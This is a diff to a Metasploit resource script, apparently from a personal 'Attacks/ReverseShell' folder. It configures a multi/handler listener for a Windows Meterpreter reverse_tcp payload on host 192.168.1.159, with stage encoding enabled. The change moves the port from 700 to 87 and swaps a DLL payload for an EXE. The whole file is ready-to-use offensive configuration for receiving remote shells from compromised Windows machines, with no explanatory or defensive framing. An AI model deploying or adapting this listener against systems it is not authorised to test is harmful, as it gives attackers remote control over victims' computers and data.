@@ -1,10 +1,10 @@
 #
-# [Kali]: msfdb start; msfconsole -q -r '/home/ghost/GitHub/Attacks/ReverseShell/windows-meterpreter-staged-reverse-tcp-700-dll.rc'
+# [Kali]: msfdb start; msfconsole -q -r '/home/ghost/GitHub/Attacks/ReverseShell/windows-meterpreter-staged-reverse-tcp-87-exe.rc'
 #
 use exploit/multi/handler
 set PAYLOAD windows/meterpreter/reverse_tcp
 set LHOST 192.168.1.159
-set LPORT 700
+set LPORT 87
 set ExitOnSession false
 set EnableStageEncoding true
 #set AutoRunScript 'post/windows/manage/migrate'
